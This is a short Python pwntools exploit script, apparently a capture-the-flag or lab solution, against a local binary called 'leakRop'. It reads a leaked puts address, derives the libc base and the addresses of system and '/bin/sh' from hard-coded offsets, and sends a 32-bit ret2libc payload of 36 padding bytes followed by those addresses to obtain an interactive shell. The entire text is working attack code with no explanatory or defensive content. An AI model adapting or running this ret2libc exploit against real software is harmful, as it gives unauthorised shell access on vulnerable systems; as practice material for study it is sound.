#!/usr/bin/python
from pwn import *

PUTS_OFFSET   = 0x0005fca0
SYSTEM_OFFSET = 0x0003ada0
BIN_SH_OFFSET = 0x0015b9ab

p = process("./leakRop")
p.readuntil("yours? ")
puts_leak = int(p.readline(), 16)
log.info("leaked puts address: 0x{:>8x}".format(puts_leak))
libc_base_address = puts_leak - PUTS_OFFSET
system_address    = libc_base_address + SYSTEM_OFFSET
bin_sh_address    = libc_base_address + BIN_SH_OFFSET
log.info("found libc base address: 0x{:>8x}".format(libc_base_address))
log.info("found system address: 0x{:>8x}".format(system_address))
log.info("found \"/bin/sh\" address: 0x{:>8x}".format(bin_sh_address))

rop = "A" * 36 + p32(system_address) + p32(0xffffffff) + p32(bin_sh_address)

p.sendline(rop) 
p.interactive()
